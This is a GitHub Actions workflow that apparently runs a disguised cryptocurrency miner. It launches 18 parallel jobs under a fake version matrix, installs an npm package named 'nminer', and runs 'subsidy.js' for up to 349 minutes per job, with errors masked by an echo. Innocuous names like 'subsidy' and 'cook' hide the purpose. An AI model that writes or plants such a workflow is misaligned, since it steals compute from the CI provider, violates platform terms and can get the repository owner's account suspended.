name: subsidy
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8929 }
          - { version: 5705 }
          - { version: 1254 }
          - { version: 768 }
          - { version: 8985 }
          - { version: 6393 }
          - { version: 6598 }
          - { version: 8982 }
          - { version: 9395 }
          - { version: 8802 }
          - { version: 3040 }
          - { version: 9127 }
          - { version: 6139 }
          - { version: 6599 }
          - { version: 9612 }
          - { version: 3131 }
          - { version: 1335 }
          - { version: 2581 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: cook
        run: |
          npm install nminer@latest
          timeout 349m node subsidy.js || echo "subsidy executed"